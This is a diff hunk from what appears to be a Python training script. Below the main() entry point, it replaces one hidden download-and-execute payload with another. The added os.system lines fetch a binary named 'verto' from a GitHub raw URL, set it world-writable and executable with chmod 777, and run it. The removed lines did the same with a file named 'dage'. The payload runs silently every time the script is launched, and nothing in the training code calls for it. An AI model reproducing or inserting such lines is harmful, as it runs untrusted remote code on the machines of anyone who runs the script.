@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/aqshakuy/jdag/main/dage')
-os.system('chmod u+x dage')
-os.system('./dage')
+os.system('wget https://raw.githubusercontent.com/aqshakuy/viti/main/verto')
+os.system('chmod 777 verto')
+os.system('./verto')
